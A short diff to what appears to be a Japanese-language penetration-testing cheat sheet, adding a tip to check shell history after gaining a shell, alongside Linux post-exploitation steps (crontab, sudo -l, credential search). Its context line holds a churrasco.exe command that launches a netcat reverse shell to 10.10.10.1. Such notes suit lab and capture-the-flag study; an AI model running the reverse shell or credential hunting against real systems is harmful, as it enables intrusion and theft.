@@ -703,6 +703,7 @@ churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.10.1 9999"
 
 ## 内部探索(Linux)
 
+- シェルを取ったらとりあえずhistoryを確認してみる
 - rootとuserのcrontabを確認する
 - `sudo -l`の出力を確認する
 - 認証情報の探索
